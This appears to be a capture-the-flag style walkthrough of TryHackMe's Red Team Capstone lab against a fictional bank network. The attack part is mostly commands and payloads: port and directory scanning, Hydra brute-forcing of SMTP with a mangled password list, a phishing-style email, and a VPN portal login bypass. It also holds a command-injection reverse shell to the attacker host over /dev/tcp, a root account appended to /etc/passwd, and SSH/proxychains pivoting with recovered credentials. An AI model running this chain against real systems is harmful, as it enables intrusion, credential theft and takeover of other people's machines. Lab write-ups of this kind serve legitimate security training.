# Red Team Capstone Challenge

**Project Registration**

The Trimento government mandates that all red teamers from TryHackMe participating in the challenge must register to allow their single point of contact for the engagement to track activities. As the island's network is segregated, this will also provide the testers access to an email account for communication with the government and an approved phishing email address, should phishing be performed.

To register, you need to get in touch with the government through its e-Citizen communication portal that uses SSH for communication. Here are the SSH details provided:

| <p>SSH Username<br></p> | <p>e-citizen<br></p>                |
| ----------------------- | ----------------------------------- |
| <p>SSH Password<br></p> | <p>stabilitythroughcurrency<br></p> |
| <p>SSH IP<br></p>       | X.X.X.250                           |

**Kali**

```
ssh e-citizen@X.X.X.250
Password: stabilitythroughcurrency
```

<figure><img src="../../.gitbook/assets/image (84) (2).png" alt=""><figcaption></figcaption></figure>



## Scanning

## Web - Scanning&#x20;

**Kali**

```
nmap -A $WEB
```

<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found.

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $WEB
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

### Web - HTTP port 80

This ran for the majority of the time I was working on the box, I found the wordpress and checked robots.txt manually and the scan didn't really find anything of interest.

**Kali**

```
dirb http://$WEB:80 /usr/share/wordlists/dirb/big.txt
```

<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

Looking for php files we found the info file which can be used to find info about the server.

**Kali**

```
dirb http://$WEB:80 /usr/share/wordlists/dirb/big.txt -X .php
```

<figure><img src="../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (37) (3).png" alt=""><figcaption></figcaption></figure>

Manually looking around there is a meet the team page, when clicking on the images we can see the folder holding all their pictures with their names, potentially could be usernames.

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**Output - users.txt**

```
antony.ross
ashley.chan
brenda.henderson
charlene.thomas
christopher.smith
emily.harvey
keith.allen
laura.wood
leslie.morley
lynda.gordon
martin.savage
mohammad.ahmed
october
october
paula.bailey
rhys.parsons.
roy.sims
theme-preview
```





**Admin Panel**

[http://10.200.119.13/october/index.php/backend/backend/auth/signin](http://10.200.119.13/october/index.php/backend/backend/auth/signin)

<figure><img src="../../.gitbook/assets/image (47) (3).png" alt=""><figcaption></figcaption></figure>





**Kali**

```
hydra -L users.txt -P mangled-passwords.txt smtp://$WebMail -V
```



##

## WebMail - Scanning&#x20;

**Kali**

```
nmap -A $WebMail
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $WebMail
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>

### WebMail - HTTP port 80

Nothing found

**Kali**

```
dirb http://$WebMail:80 /usr/share/wordlists/dirb/big.txt
```

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

### Evolution

**Kali**

```
apt install evolution -y
evolution &
```

<figure><img src="../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>



### Bruteforce SMTP

Add domain to end of every username

**Kali**

```
sed -i 's/$/@corp.thereserve.loc/' users.txt
```

**Kali**

```
subl /opt/john/john.conf
```

Add the following to the bottom of john.conf

**john.conf**

```
#Custom Rules
[List.Rules:Capstone]
Az"[0-9]" $[!@#%^]
```

**Kali**

```
john --wordlist=Capstone_Challenge_Resources/password_base_list.txt --rules=Capstone --stdout > mangled-passwords.txt
```

**Kali**

```
hydra -L users.txt -P mangled-passwords.txt smtp://$WebMail -V -o smtp-results.txt
```

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>



### Evolution - laura.wood@corp.thereserve.loc

Email sent to emily.harvey@corp.thereserve.loc

```
Dear Emily,

I hope this message finds you well. I wanted to inform you about an
exciting development for our organization. We have recently acquired a
new customer who is interested in investing in a reputable bank, and we
believe "TheReserve" bank is an excellent choice for their investment goals.

"TheReserve" bank has a strong track record of financial stability,
customer satisfaction, and a wide range of investment opportunities.
They are renowned for their expertise in wealth management, corporate
banking, and private client services. We believe that by partnering with
them, our customer can benefit from their extensive experience and
comprehensive financial solutions.

The customer is specifically looking to invest a substantial amount and
is seeking guidance on the available investment options and potential
returns. As our resident expert in financial planning and investment
strategies, I would like to request your assistance in advising this
client on the investment opportunities offered by "TheReserve" bank.

Please review the customer's investment preferences and financial
objectives, and provide a detailed recommendation outlining the most
suitable investment options that align with their goals. It would be
helpful if you could emphasize the key benefits and features of each
investment, including potential returns, risk factors, and any other
relevant considerations.

Additionally, if there are any specific documents or forms that the
customer needs to complete to initiate the investment process with
"TheReserve" bank, please provide those as well. Ensuring a smooth and
seamless experience for our customer is of utmost importance to us.

If you have any questions or require any further information, please
don't hesitate to reach out to me. I appreciate your expertise and
dedication to delivering exceptional service to our clients, and I am
confident that you will provide valuable insights to our new customer in
their investment journey.

Thank you for your prompt attention to this matter. I look forward to
hearing from you soon.

Best regards,


```

### Evolution - mohammad.ahmed@corp.thereserve.loc

Email sent to mohammad.ahmed@corp.thereserve.loc

```
Sorry, you message was flagged as spam and has been automatically deleted.

Regards,SpamBot

On Thu, 18 May 2023 08:49:01 -0400, Mohammad Ahmed <mohammad.ahmed@corp.thereserve.loc> wrote:
Dear Emily,

I hope this message finds you well. I wanted to inform you about an 
exciting development for our organization. We have recently acquired a 
new customer who is interested in investing in a reputable bank, and we 
believe "TheReserve" bank is an excellent choice for their investment goals.

"TheReserve" bank has a strong track record of financial stability, 
customer satisfaction, and a wide range of investment opportunities. 
They are renowned for their expertise in wealth management, corporate 
banking, and private client services. We believe that by partnering with 
them, our customer can benefit from their extensive experience and 
comprehensive financial solutions.

The customer is specifically looking to invest a substantial amount and 
is seeking guidance on the available investment options and potential 
returns. As our resident expert in financial planning and investment 
strategies, I would like to request your assistance in advising this 
client on the investment opportunities offered by "TheReserve" bank.

Please review the customer's investment preferences and financial 
objectives, and provide a detailed recommendation outlining the most 
suitable investment options that align with their goals. It would be 
helpful if you could emphasize the key benefits and features of each 
investment, including potential returns, risk factors, and any other 
relevant considerations.

Additionally, if there are any specific documents or forms that the 
customer needs to complete to initiate the investment process with 
"TheReserve" bank, please provide those as well. Ensuring a smooth and 
seamless experience for our customer is of utmost importance to us.

If you have any questions or require any further information, please 
don't hesitate to reach out to me. I appreciate your expertise and 
dedication to delivering exceptional service to our clients, and I am 
confident that you will provide valuable insights to our new customer in 
their investment journey.

Thank you for your prompt attention to this matter. I look forward to 
hearing from you soon.

Best regards,

```

## VPN - Scanning&#x20;

**Kali**

```
nmap -A $VPN 
```

<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

OpenVPN port potentially found

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VPN 
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>

### VPN - HTTP port 80



**Kali**

```
dirb http://$VPN:80 /usr/share/wordlists/dirb/big.txt
```

<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

vpn folder has a .ovpn file.

<figure><img src="../../.gitbook/assets/image (86) (2).png" alt=""><figcaption></figcaption></figure>

Had to change the IP in the ovpn file but if I see the correct subnet.

**Kali**

```
openvpn corpUsername.ovpn
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

If I type my username and password provided I get a login error but if I try with a fake account with no password set I can bypass the login and download a ovpn file

<figure><img src="../../.gitbook/assets/image (27) (5).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (42) (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7) (2) (3).png" alt=""><figcaption></figcaption></figure>

It appears to work

**Kali**

```
openvpn fake.ovpn
```

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ip a
```

<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nmap -sP 12.100.1.1-255
```

<figure><img src="../../.gitbook/assets/image (85) (2).png" alt=""><figcaption></figcaption></figure>

### Reverse shell

**Kali**

```
nc -lvnp 1337
```

**Burp Request**

```
GET /requestvpn.php?filename=hack+%26%26+bash+-i+>%26+/dev/tcp/$Kali/1337+0>%261 HTTP/1.1
Host: 10.200.119.12
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.200.119.12/vpncontrol.php
Cookie: PHPSESSID=ra6pkkf1ei3v7gq52pcvpk1b95
Upgrade-Insecure-Requests: 1


```

**Victim**

```
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

#### LinPeas

**Kali**

```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
python2 -m SimpleHTTPServer 81
```

**Victim**

```
cd /tmp/
wget http://$KALI:81/linpeas.sh
chmod +x linpeas.sh 
./linpeas.sh
```



<figure><img src="../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

### Privlege Escalation

**Kali**

```
openssl passwd -1 -salt new 123
echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> passwd
python2 -m SimpleHTTPServer 81
```

**passwd**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash

```



**Victim**

```
cd /tmp/
wget http://$KALI:81/passwd
sudo cp passwd /etc/passwd
```

**Victim**

```
su new
Password: 123
```

<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

### Pivot

**Kali**

```
ssh-keygen -t rsa
cat /root/.ssh/id_rsa.pub
```

**Victim**

```
copy id_rsa.pub to /home/ubuntu/.ssh/authorized_keys
```

**Kali**

```
ssh -D 9050 ubuntu@VPN
```

**Kali**

```
vi /etc/proxychains.conf
```

**proxychains.conf**

```
socks4 	127.0.0.1 9050
```

#### Scanning other hosts

**Victim**

```
nmap -sn 10.200.119.0/24
```









12.100.1.10

## WebMail- Scanning&#x20;

**Kali**

```
nmap -A $WebMail
```



### Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $WebMail
</strong></code></pre>





<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

We now have access to our mailbox

<figure><img src="../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

The following email is in my inbox

<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

### 10.200.119.21

**Kali**

```
nmap -p- 10.200.119.21 -Pn 
```



**Kali**

```
remmina
```

**Remmina**

<pre><code><strong>Username: laura.wood
</strong>Password: Password1@
Domain: corp.thereserve.loc
</code></pre>

<figure><img src="../../.gitbook/assets/image (51) (4).png" alt=""><figcaption></figcaption></figure>

**Remmina**

<pre><code><strong>Username: laura.wood
</strong>Password: Password1@
Domain: corp.thereserve.loc
</code></pre>



**Remmina**

<pre><code><strong>Username: mohammad.ahmed
</strong>Password: Password1!
Domain: corp.thereserve.loc
</code></pre>

### 10.200.119.22

**Kali**

```
nmap -p- 10.200.119.21 -Pn 
```

##

##

**Remmina**

<pre><code><strong>Username: mohammad.ahmed
</strong>Password: Password1!
Domain: corp.thereserve.loc
</code></pre>

## Creds found

```
#SMTP creds found for WebMail
[25][smtp] host: 10.200.119.11   login: laura.wood@corp.thereserve.loc   password: Password1@
[25][smtp] host: 10.200.119.11   login: mohammad.ahmed@corp.thereserve.loc   password: Password1!

```



